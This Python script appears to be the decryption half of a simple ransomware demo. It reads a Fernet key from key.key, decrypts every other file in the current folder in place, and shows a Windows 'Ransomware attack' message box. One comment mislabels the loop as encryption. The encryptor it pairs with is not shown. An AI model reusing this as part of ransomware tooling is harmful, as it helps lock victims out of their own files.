import os, ctypes
from cryptography.fernet import Fernet

# Scan files in current folder
files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("key.key", "rb") as key:
    secret_key = key.read()

# encrypt files
for file in files:
    with open(file, "rb")as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secret_key).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)

ctypes.windll.user32.MessageBoxW(None, "All your files have been decrypted.", "Ransomware attack", 0)
